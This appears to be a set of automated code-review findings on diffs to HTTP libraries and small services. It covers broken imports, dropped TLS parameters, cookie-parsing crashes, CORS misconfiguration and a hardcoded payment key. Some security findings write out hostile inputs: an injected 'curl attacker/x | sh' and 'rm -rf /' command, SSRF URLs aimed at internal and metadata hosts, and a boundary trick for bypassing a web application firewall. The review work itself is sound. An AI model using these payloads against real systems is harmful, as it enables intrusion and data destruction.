_Also raised by the correctness agent:_ Docstring still documents the old `page_size` parameter

findings.title: Absolute `from adapters import HTTPAdapter` will fail at import time
findings.body: Every other intra-package import in this file uses the explicit relative form (`from .utils import ...`, `from .packages.urllib3.poolmanager import PoolManager`). `from adapters import HTTPAdapter` is an absolute import of a top-level module named `adapters`, which does not exist on the path when `requests` is installed; under Python 3 (and under Python 2 with `absolute_import`) this raises `ImportError` on `import requests`. Change it to `from .adapters import HTTPAdapter`.

findings.title: verify/cert accepted by request() but never reach the adapter
findings.body:
The rewritten `request()` still accepts `verify=None` and `cert=None` (lines 148-149), but unlike every other argument it never assigns them to `req` and never passes them to `self.send()`/`adapter.send()` (lines 151-167). `send()` calls `adapter.send(request)` with the request only, so whatever TLS policy the adapter defaults to is used unconditionally and the caller's choice is discarded.

Adversary: anyone able to intercept the TLS path (hostile Wi-Fi, upstream proxy, DNS/BGP attacker). They control the server certificate presented. What they get: if the adapter's default is not strict verification, every HTTPS request made through this path is MITM-able even though the caller asked for `verify='/my/ca.pem'` or supplied a client `cert`. At minimum, a caller pinning a CA bundle or presenting a client certificate is silently downgraded with no error.

Fix: thread `verify` and `cert` (and the session config defaults) onto the prepared request or into the `send()` signature so `HTTPAdapter.send` can apply `cert_verify`, and fail loudly rather than ignoring them while the refactor is incomplete.

findings.title: `_send_request` deleted but still called by `old_request`
findings.body: The `_send_request` helper was removed, but the (renamed but still reachable) `old_request` method still ends with `return self._send_request(r, **args)`. Any call into `old_request` now raises `AttributeError: 'Session' object has no attribute '_send_request'`. Either restore the helper, inline `r.send(prefetch=...)` / `return r.response`, or remove `old_request` entirely.

findings.title: New `request()` silently ignores timeout, verify, cert, prefetch, return_response, config
findings.body: The new `request()` keeps the full public keyword signature but only forwards method/url/headers/files/data/params/auth/cookies/allow_redirects/proxies/hooks onto the `Request`. `timeout`, `verify`, `cert`, `prefetch`, `return_response` and `config` are accepted and then dropped on the floor. These are not cosmetic: callers passing `timeout=` now hang indefinitely, callers passing `verify=False`/`cert=` get different TLS behaviour than requested, and `return_response=False` callers get a response object instead of the request. Silently accepting and ignoring a parameter is worse than raising. Either thread them through to `prepare()`/`send()` or drop them from the signature until they are wired up.

findings.title: A fresh HTTPAdapter per send defeats pooling; close() no longer releases connections
findings.body: `send()` constructs a new `HTTPAdapter()` on every call, so each request gets a brand-new connection pool that is then discarded — connection reuse (the entire point of `Session`) is gone and sockets accumulate until GC. At the same time `close()` (and therefore `__exit__`) has been reduced to `pass`, so nothing is ever explicitly cleared. Hold one adapter on the session (created in `__init__`) and have `close()` call its `close()`/`clear()`.

findings.title: Mid-refactor behaviour changes ship with no test coverage
findings.body: This diff rewrites Session.close() into a no-op (previously closed the PoolManager), replaces Session.request() with a new implementation that builds a Request/PreparedRequest and delegates to send(), and changes send() to route through a new HTTPAdapter class instead of request.send(). None of this is exercised by any test in the diff. If close() silently stops releasing pooled connections, or if the new request()->prepare()->send() pipeline drops a parameter (e.g. return_response, verify, cert are accepted but never used), nothing would fail — there is no assertion anywhere that a request actually gets sent correctly through the new adapter path or that resources are released on close().

findings.title: `Session.poolmanager` attribute removed while legacy send path may still use it
findings.body: `init_poolmanager()` and the `self.poolmanager` attribute are gone, but `PoolManager` is still imported (line 19) and the legacy path (`old_request` -> `r.send()`) historically obtains its connection from `self.session.poolmanager`. Any code — inside `models.py` or in user code/subclasses that override `init_poolmanager` to customise pool size or SSL — that touches `session.poolmanager` now raises `AttributeError`. Confirm no remaining reference exists (including in `models.Request.send`) before landing, or keep the attribute until the adapter path fully replaces the old one.

findings.title: Top-level `from adapters import HTTPAdapter` allows module shadowing
findings.body:
Every other import in this module is package-relative (`from .utils import ...`, `from .packages.urllib3.poolmanager import PoolManager`), but the new adapter import is absolute. Under Python 3 (and under Python 2 with `absolute_import`) this resolves against `sys.path`, not the `requests` package, so it will either fail outright or bind to any top-level `adapters` module that happens to be importable.

Adversary: anyone who can drop a file into a directory on `sys.path` — most commonly the process working directory, which for a script-launched application is attacker-writable in shared/CI/tmp deployments. What they get: arbitrary code execution inside the HTTP client at import time, plus control of the object that sends every request (credentials, bodies, TLS settings).

Use `from .adapters import HTTPAdapter` to match the rest of the module.

findings.title: `close()` is now a no-op but its name still implies resource cleanup
findings.body: `close()` previously had a docstring explaining it disposes of the PoolManager's pooled connections; both the docstring and the actual cleanup logic have been removed, leaving `pass`. The method name `close` still strongly implies it releases resources. A caller relying on the (now-absent) contract implied by the name would reasonably still expect calling `.close()` to matter.

findings.title: New public `request()` has no docstring for its non-obvious parameters
findings.body: The new `request()` method (the one actually wired up to `send`) carries no docstring, whereas its sibling `old_request()` (further down, unchanged) retains the original explanation. Several parameters here are not self-explanatory from name alone — `prefetch`, `config`, `return_response`, `verify`, `cert` — so a caller of the now-primary entry point has no documentation to consult.

findings.title: Malformed Cookie header makes `request.cookies` return None, breaking callers
findings.body:
When `SimpleCookie.load()` raises (a client can trigger this with a malformed `Cookie:` header), the new property assigns `self._cookies = None` and returns `None`. The value is also cached, so every later access returns `None` too.

Every consumer assumes a mapping: `get_cookie` does `if name in self.request.cookies` (TypeError: argument of type 'NoneType' is not iterable) and `clear_all_cookies` does `self.request.cookies.iterkeys()` (AttributeError). The old code never returned a non-mapping — on failure it called `clear_all_cookies()` and still returned the `SimpleCookie` instance. So an attacker-controlled header turns a benign parse failure into a 500 on any handler that reads a cookie.

Reset to an empty `Cookie.SimpleCookie()` on failure instead of `None`.

_Also raised by the security agent:_ Malformed Cookie header makes request.cookies None, crashing handlers

findings.title: `RequestHandler.cookies` removed without a compatibility shim
findings.body: `RequestHandler.cookies` was a documented public property; subclasses and application code commonly read `self.cookies` directly. Deleting it rather than leaving `cookies = property(lambda self: self.request.cookies)` (or an equivalent forwarding property) breaks those callers with an AttributeError at runtime, with no deprecation path. Consider keeping a thin forwarding property on `RequestHandler` that delegates to `self.request.cookies`.

findings.title: No test covers new cookie-parse-failure behavior
findings.body: The cookies property was moved from RequestHandler to HTTPRequest, and its error-handling behavior changed: previously a parse failure called self.clear_all_cookies() (an empty-but-valid SimpleCookie stayed in place); now on failure self._cookies is set to None. This means request.cookies can now return None, and downstream code (get_cookie's `name in self.request.cookies`, clear_all_cookies' `self.request.cookies.iterkeys()`) would raise a TypeError/AttributeError when parsing fails, instead of silently returning defaults as before. No test exercises a malformed 'Cookie' header, so this change in failure-mode behavior would not be caught by the existing test suite.

findings.title: cookies docstring says 'dictionary' but property can now return None
findings.body: The docstring for `cookies` states "A dictionary of Cookie.Morsel objects." On the old RequestHandler.cookies, a parse failure fell back to `self.clear_all_cookies()` while `self._cookies` remained a SimpleCookie instance. The moved version instead sets `self._cookies = None` on exception (line 523), so the property can now return `None`, which is not a dictionary and contradicts its own docstring. Callers relying on the documented dict contract (e.g. `name in self.request.cookies`) would break on a malformed Cookie header.

findings.title: Missing strip() makes boundary lookup fail for normal headers
findings.body:
`content_type.split(";")` yields parameters that retain the leading space clients put after the semicolon, e.g. `"multipart/form-data; boundary=----abc"` gives `" boundary=----abc"`. `field.partition("=")` then produces `k == " boundary"`, which never equals `"boundary"`, so the loop finishes without breaking, the `for ... else` branch fires and logs "Invalid multipart/form-data", and `_parse_mime_body` is never called. The previous code searched for the substring `'boundary='` and was immune to surrounding whitespace, so this is a regression that silently disables all multipart form/file parsing for the overwhelmingly common header form.

Fix by normalising each parameter before matching, e.g. `k, sep, v = field.strip().partition("=")`. While you are there, consider `k.lower()` and stripping surrounding double quotes from `v`, since RFC 2045 permits `boundary="..."` and case-insensitive parameter names.

_Also raised by the security agent:_ Content-Type parameters not stripped, so boundary is never matched

findings.title: No test covers boundary parsing when boundary is not the last Content-Type field
findings.body: The change fixes a real bug (boundary assumed to be the last parameter in Content-Type), but the diff adds no test exercising a Content-Type header like 'multipart/form-data; charset=utf-8; boundary=xyz' where boundary appears before the end. If this logic regresses (e.g. back to the old split-based assumption, or breaks on whitespace like '; boundary=xyz' with a leading space in v), nothing in the existing suite would fail.

findings.title: get_host host extraction disagrees with urlparse (SSRF parser differential)
findings.body:
`get_host` is the function that decides which host urllib3 actually connects to, and it derives the host by hand: split on `://`, then on the first `/`, then on the *first* `@`. It never strips a query (`?`) or fragment (`#`) before looking for `@`, and it uses the first `@` where RFC 3986 / `urlparse` / browsers use the last one.

Consequences for a URL an attacker supplies to an application that validates before fetching:

- `http://allowed.com#@internal.svc/` — `urlparse(...).hostname` is `allowed.com`; `get_host` returns `internal.svc` (line 93 strips nothing because there is no `/` before the `#`, line 95 then splits on the `@` inside the fragment).
- `http://allowed.com?@169.254.169.254/` — same differential, host becomes `169.254.169.254`.
- `http://a@evil.com@good.com/` — `urlparse` says `good.com`, line 95's `split('@', 1)` yields `evil.com@good.com`.

Adversary: anyone who can hand a URL (or a redirect `Location`) to a service that allowlists it with the stdlib and then fetches it with urllib3. What they get: a connection to an internal/metadata host that the allowlist believed it had rejected.

Suggested fix: strip `?`/`#` before host parsing and use `rpartition('@')` for the userinfo split, or delegate to `urlparse`/`urlsplit` and keep only the port validation locally.

findings.title: LocationParseError message has an unformatted %s placeholder
findings.body: The raised message is the literal string `"Failed to parse: %s"` — the `%s` is never substituted, so every parse failure produces an error that identifies nothing about the offending URL. Given this is the sole diagnostic a caller gets for a malformed host, it should be `raise LocationParseError("Failed to parse: %s" % url)` (or include the original url before it was split). Debugging a bad URL from a caller-supplied config becomes guesswork otherwise.

findings.title: accept_encoding unicode string silently replaced with 'gzip,deflate' on Py2
findings.body: The branch tests `isinstance(accept_encoding, str)`. Under Python 2 a `unicode` value (e.g. from a config file read with `io.open`, or a module using `from __future__ import unicode_literals`) is neither `str` nor `list`, so it falls into the `else` branch and the caller's requested encoding is silently discarded and replaced with `'gzip,deflate'` — a wrong result rather than an error. The module already imports `six` for `six.b` on line 68, so `isinstance(accept_encoding, six.string_types)` is available and would fix this consistently for both interpreters.

findings.title: No tests included for new util.py helpers
findings.body: This PR lifts make_headers, get_host, and is_connection_dropped into a new module but includes no test file. If these functions have existing tests elsewhere in the repo that continue to pass (e.g. by importing from the old location), this may be fine; but since no repository context confirms that, a regression introduced during the move (e.g. the get_host parsing logic or is_connection_dropped's poll/select branching) would not be caught by this change alone.

findings.title: No test exercises sorting by the 'status' column
findings.body: SORTABLE now allows sort='status', but no test calls list_invoices with sort='status' to confirm the column maps correctly and the query executes as expected. If the mapping for 'status' were wrong (e.g. mapped to a non-existent column or wrong ORDER direction), nothing here would catch it.

findings.title: No test verifies describe() still returns correct strings after removing casts
findings.body: The change removes redundant type casts but relies on TypeScript's discriminated union narrowing to still compile and behave identically. No test file is present in the diff, and no repository context shows existing tests for `describe`. A regression (e.g. accidentally breaking narrowing or introducing a typo in field access) would not be caught by anything shown here.

findings.title: HTTPMove.location now exposes a URL object instead of the original string
findings.body:
Previously `self.location` was assigned the raw `location` argument, and only the header used `str(URL(location))`. After this change the attribute holds a `yarl.URL`. The documented contract (docs/web_reference.rst) states `HTTPMove.location` is "the location the response redirects to, as the string it was constructed with", and that application code compares it against configured strings and calls `str.startswith` on it. With a `URL` instance, `resp.location.startswith(...)` raises `AttributeError` and `resp.location == "/login"` silently becomes `False`, so redirect-checking logic fails without an error in the equality case.

If reusing the parsed value is the goal, keep the attribute as the original string and use a local variable for the header, e.g. `url = URL(location); self.headers['Location'] = str(url); self.location = location`. If exposing a `URL` is intentional, it is a breaking public API change and needs a deprecation path plus a docs update.

_Also raised by the security agent:_ `location` attribute type change can silently void redirect allowlist checks

findings.title: self.location now a URL object, contradicting documented string contract
findings.body: docs/web_reference.rst states that `HTTPMove.location` is "the location the response redirects to, as the string it was constructed with" and notes application code passes it to `str.startswith`. After this change, `self.location = URL(location)` stores a `yarl.URL` object instead of the original string, so that documented contract is now false. Callers relying on the documented behavior (e.g. calling `.startswith` directly on `location`) will break with an `AttributeError` since `URL` has no `startswith` method. Either update the docstring/reference to reflect the new type, or keep a string alongside the URL to preserve the documented contract.

findings.title: No test guards self.location's documented string type
findings.body: self.location is now assigned URL(location) instead of the original string, which contradicts the documented attribute contract ('as the string it was constructed with', compared via str.startswith). No test in this change (or apparently in the existing suite) asserts that self.location remains a str equal to the original input, so this behavior change would pass silently even though downstream code doing `.startswith()` or string equality checks would break.

findings.title: readany() can return b'' before EOF after loop is replaced with `if`
findings.body:
`_wait()` is documented to resolve the waiter not only on `feed_data()`/`feed_eof()` but also at the end of a chunk, which "can happen with no new data in the buffer, so a caller must re-check its condition after waking rather than assuming data arrived." The `while` loop was exactly that re-check. With a single `if`, one spurious wake-up (end-of-chunk resolution) drops through to `return self._read_nowait(-1)` with an empty buffer and `self._eof` still False, so `readany()` returns `b''`.

An empty return from `readany()` is the documented end-of-stream sentinel; callers looping `while True: chunk = await resp.content.readany(); if not chunk: break` will silently truncate the body mid-response. Restore the `while` loop (or otherwise re-check `self._buffer`/`self._eof` after the await) so the coroutine only returns once data is available or EOF is reached.

_Also raised by the security agent:_ Single wait lets readany() return b"" early, mimicking EOF

findings.title: No test covers spurious-wake retry behavior removed by while->if change
findings.body: The docstring for _wait() explicitly warns that the waiter can be resolved 'at the end of a chunk, which can happen with no new data in the buffer, so a caller must re-check its condition after waking rather than assuming data arrived.' The diff replaces the retry `while not self._buffer and not self._eof` with a single `if`, removing the re-check loop that the docstring says is required. If this is wrong — i.e., if a spurious wake with no new data and no EOF can still occur — readany() would now return via _read_nowait(-1) on an empty buffer instead of waiting again, and no test in the suite would catch that regression since there is no test exercising the spurious-wake-without-data path for readany().

findings.title: Implicit relative import breaks module loading on Python 3
findings.body: `from adapters import HTTPAdapter` is not the same module as `from .adapters import HTTPAdapter`. Implicit relative imports were removed in Python 3 (PEP 328); the name is resolved as a top-level module on `sys.path`. Unless a top-level `adapters` package is installed, importing `requests.sessions` — and therefore `import requests` — raises `ModuleNotFoundError`. Even on Python 2 it is fragile: it silently shadows/gets shadowed by any top-level `adapters` module in the environment. Restore the leading dot.

findings.title: Absolute `from adapters import` allows sys.path module shadowing
findings.body:
`from .adapters import HTTPAdapter` unambiguously loads the `adapters` submodule that ships inside the `requests` package. `from adapters import HTTPAdapter` instead resolves through `sys.path`, whose first entry is the script directory (or, for `python -c` / interactive / some embedded hosts, the current working directory). Any writable directory that precedes site-packages on `sys.path` can therefore supply an `adapters.py` whose top-level code runs with full process privileges the moment anything imports `requests.sessions`.

The adversary is anyone who can drop a file into a directory on the importing process's `sys.path` — a co-tenant on a shared host, a user who can write to the app's working directory, or an unpacked archive that is later run from its own folder. What they control is the file name and contents; what they get is arbitrary code execution inside every process that imports requests, plus the ability to return a hostile `HTTPAdapter` that sees all request/response bodies and TLS settings.

Revert to the explicit relative form `from .adapters import HTTPAdapter`. (It is also the only form that works at all on Python 3, where implicit relative imports were removed — so this line will additionally raise `ModuleNotFoundError` there.)

findings.title: get_cookie raises TypeError when request.cookies is None
findings.body:
`self.request.cookies` is documented to return `None` when a Cookie header is present but cannot be parsed, and the property explicitly does `if self._cookies is None: return None`. With the guard removed, `name in self.request.cookies` evaluates `in` against `None` and raises `TypeError: argument of type 'NoneType' is not iterable`, turning a malformed client-supplied Cookie header into a 500 for every handler that calls `get_cookie` (including secure-cookie and XSRF paths that build on it). The premise in the PR description — that cookies is always a mapping after construction — is contradicted by the property itself. Restore the `self.request.cookies is not None and ...` guard, or change the `cookies` property to return an empty mapping on parse failure and audit the other consumers that currently test for `None`.

_Also raised by the tests agent:_ No test covers get_cookie when request.cookies is None

findings.title: Removed None guard lets a malformed Cookie header crash get_cookie
findings.body:
`HTTPRequest.cookies` is documented in `tornado/httpserver.py` to return `None` when the `Cookie` header is present but cannot be parsed, and its docstring states "every consumer has to allow for that". After this change `get_cookie` evaluates `name in self.request.cookies` unconditionally, which raises `TypeError: argument of type 'NoneType' is not iterable` for any request carrying a malformed cookie header.

Adversary: any unauthenticated remote client. What they control: the raw `Cookie` request header. What they get: an unhandled exception turning into a 500 for every handler that calls `get_cookie` — including the XSRF/secure-cookie paths that call it early in request processing, and any `write_error`/error-rendering code that reads a cookie, which would fault a second time while producing the error page.

Either restore the `self.request.cookies is not None and ...` guard here, or change the `cookies` property to return an empty mapping instead of `None` so the "always a mapping after construction" assumption in the PR description actually holds.

findings.title: Dropping strip() breaks boundary detection for standard headers
findings.body:
`content_type.split(";")` yields tokens that keep the whitespace following each semicolon, e.g. `"multipart/form-data; boundary=abc"` splits into `["multipart/form-data", " boundary=abc"]`. The removed `.strip()` was what normalised that token before `partition("=")`, so with this change `k` is `" boundary"` and the comparison `k == "boundary"` on line 5 fails. The loop then completes without ever calling `_parse_mime_body`, so multipart bodies are silently not parsed: form fields and uploaded files disappear for essentially every real-world client (RFC 7231 / RFC 2046 allow, and virtually all clients emit, the optional whitespace after `;`).

The strip also removed trailing whitespace/CR from the final parameter, which affected the boundary value itself. Restore `field.strip().partition("=")`, or at minimum strip the key and value separately.

findings.title: Dropping strip() on Content-Type params creates a boundary parser differential
findings.body:
`content_type` comes straight from the client's `Content-Type` request header. After `split(";")` every parameter except the first carries the conventional leading space, so with `.strip()` removed `k` is `" boundary"` and the `k == "boundary"` test on line 5 fails for the ordinary header `multipart/form-data; boundary=abc`. Two consequences, both attacker-reachable:

1. Fail-open-ish behaviour change: for normal, spec-shaped headers no boundary is found, `_parse_mime_body` is never called, and the multipart body is silently discarded — handlers see empty `arguments`/`files` for a request that any intermediary (proxy, WAF, logger) parsed and accepted as a real upload.
2. Parser differential: an attacker who sends `Content-Type: multipart/form-data; boundary=A;boundary=B` gets Tornado to select `B` (the only parameter without a leading space), while an RFC-tolerant intermediary that trims whitespace selects the first parameter `A`. The two parsers then disassemble the same body into different parts, which is the standard shape of a WAF/inspection bypass for uploaded content.

Additionally, `v` is no longer trimmed, so a trailing space or CR in the header value becomes part of the boundary string passed to `_parse_mime_body` on line 6, giving another way to make Tornado's part-splitting disagree with an upstream parser.

Restore the normalisation, e.g. `k, sep, v = field.strip().partition("=")` (and keep `v` trimmed), or parse the header with a proper structured-header parser.

findings.title: No test covers the changed whitespace-handling behavior
findings.body: The change removes field.strip() before partitioning on "=", so k is now compared to "boundary" without trimming leading whitespace. Typical Content-Type headers look like "multipart/form-data; boundary=xxx" — after splitting on ";", the second field is " boundary=xxx" with a leading space, so k would be " boundary" instead of "boundary", and the equality check on line 5 would fail, silently breaking boundary parsing for standard headers. There is no test in this diff (or referenced) that sends a semicolon-separated Content-Type with a space before the boundary parameter, so this regression would not be caught.

findings.title: Format placeholder left unsubstituted in LocationParseError message
findings.body: The `% url` argument was removed but the `%s` placeholder was left in the format string, so the error now reads literally `Failed to parse: %s` and no longer identifies the offending URL. If the intent was to shorten the message, drop the placeholder too (e.g. `LocationParseError(url)` or a static string); if the URL should still be reported, restore `"Failed to parse: %s" % url`.

findings.title: Error message now prints literal "%s" instead of the URL
findings.body: The stated intent is to shorten the message since detail is in the exception type, but the change removes the `% url` interpolation entirely. Since there is no longer a `%` operator applied to the string, `LocationParseError("Failed to parse: %s")` will produce the literal text 'Failed to parse: %s' rather than raising a TypeError or showing anything useful — the placeholder is never filled. This is not a shortened message, it's a broken one: it advertises a URL detail via the '%s' token that never gets substituted, misleading anyone reading the exception text.

findings.title: No test verifies LocationParseError message content
findings.body: The change removes the '% url' substitution, so the raised message will literally contain the string "%s" instead of the actual URL. There is no test in this diff (or apparently in the surrounding suite) that asserts on the exception message text, so this behavior change — a real defect — would pass silently through any existing test run.

findings.title: Command injection via shell=True in create_archive
findings.body:
`create_archive` interpolates `name` and `directory` into a shell string on line 9 and executes it with `shell=True` on line 10. Any shell metacharacter in either argument escapes the intended `tar` invocation: e.g. `directory='.; curl attacker/x | sh'` or `name='x; rm -rf /'` runs arbitrary commands as the service user.

Fix by dropping the shell and passing an argument list, matching `list_exports` on line 5:

```python
dest = os.path.join("/exports", f"{name}.tar.gz")
return subprocess.run(["tar", "-czf", dest, directory], check=True)
```

Separately, `name` is concatenated into a path with no validation, so `name='../../etc/cron.d/x'` writes the tarball outside `/exports`. Normalise the joined path and assert it stays under `/exports` before writing.

_Also raised by the correctness agent:_ Unquoted f-string interpolation into shell=True breaks on spaces/metacharacters

findings.title: No test exists for create_archive's command construction
findings.body: create_archive builds a shell command via string interpolation of `name` and `directory` and executes it with shell=True. There is no test in this diff verifying the resulting tarball, the command string built, or behavior on inputs containing special characters. Since the sibling function list_exports isn't shown to have tests either, this may match existing coverage level, but this function introduces new, riskier behavior (shell=True with interpolated input) that has zero test coverage, so any regression (e.g., broken quoting, wrong path, wrong archive name) would go undetected.

findings.title: dashboardCors allows any origin with credentials enabled
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`, discarding the `ALLOWED` allowlist used by the existing export two lines above. Any route mounted with this middleware is reachable cross-origin from every website on the internet.

Adversary: any site an authenticated user visits. What they control: a page that issues `fetch(api, {credentials: 'include'})`. What they get: depending on how the wildcard is emitted, either (a) unauthenticated read access to every endpoint behind this middleware from any origin — enough to expose data that was previously protected only by being same-origin/internal — or (b), if any layer (a proxy, or a later "fix" that reflects `req.headers.origin` to make credentials actually work, which is the usual next step once the wildcard is found not to send cookies) echoes the caller's origin, full read access to authenticated responses, i.e. a session-riding data-exfiltration primitive.

Note the combination is also self-contradictory: per the Fetch spec a browser rejects a credentialed response whose `Access-Control-Allow-Origin` is literally `*`, so as written the dashboard will not actually get its cookies through. Fix it the way the existing export does — enumerate the dashboard origin (or add it to `ALLOWED`) and keep `credentials: true`, never `*` with credentials.

findings.title: origin "*" with credentials:true cannot work for cookie requests
findings.body:
The PR's stated goal is to let the dashboard call the API *with cookies*, but `origin: "*"` together with `credentials: true` is exactly the combination the Fetch/CORS spec forbids: when a request is made with `credentials: 'include'`, the browser rejects a response whose `Access-Control-Allow-Origin` is the literal `*` and fails the request, regardless of `Access-Control-Allow-Credentials`. So cookie-bearing dashboard calls will still be blocked.

The fix that actually satisfies the intent is to echo a specific allowed origin: add the dashboard origin to the existing `ALLOWED` list used on line 6 and reuse that middleware, or pass an origin function/array that reflects only the dashboard origin. Note the alternative failure mode is worse: if the `cors` implementation reflects `req.headers.origin` rather than emitting a literal `*` for `origin: "*"`, the requests succeed and every site on the internet gains credentialed access to this API.

findings.title: New dashboardCors export has no accompanying test
findings.body: The new `dashboardCors` middleware combines `origin: "*"` with `credentials: true`, a configuration that most CORS libraries reject or silently misbehave with. No test file is present in this diff to verify the resulting behavior (e.g., what Access-Control-Allow-Origin header is actually emitted, whether credentials are honored). If this configuration is later 'fixed' or the underlying cors library changes how it handles wildcard+credentials, nothing would fail.

findings.title: Live AcmePay secret key hardcoded, replacing env var lookup
findings.body:
`ACMEPAY_SECRET_KEY` is a literal `acme_live_...` credential committed to the repository, and `client()` now assigns it to `acmepay.api_key` instead of reading `os.environ["ACMEPAY_SECRET_KEY"]`. The `acme_live_` prefix indicates a production key, not a sandbox one.

Adversary: anyone with read access to this repository or to any artifact built from it — CI logs, container images, forks, a mirror, a future open-sourcing, or a laptop backup. They control nothing; they simply read the file. What they get: the ability to authenticate to AcmePay as this merchant and issue charges, refunds, or read payment data.

Actions: (1) treat this key as compromised and rotate it at AcmePay immediately — removing the line in a follow-up commit does not help, git history retains it; (2) restore the `os.environ["ACMEPAY_SECRET_KEY"]` lookup and the `import os` that was dropped; (3) add a secret scanner / pre-commit hook so this class of change is blocked at commit time.

findings.title: Live API key hardcoded, removing per-environment configuration
findings.body: `client()` previously read `ACMEPAY_SECRET_KEY` from the process environment, so each deployment (local, CI, staging, production) supplied its own credential and a missing value failed loudly with a `KeyError`. After this change the module-level constant on line 4 — an `acme_live_` prefixed key — is baked in and used unconditionally on line 8.
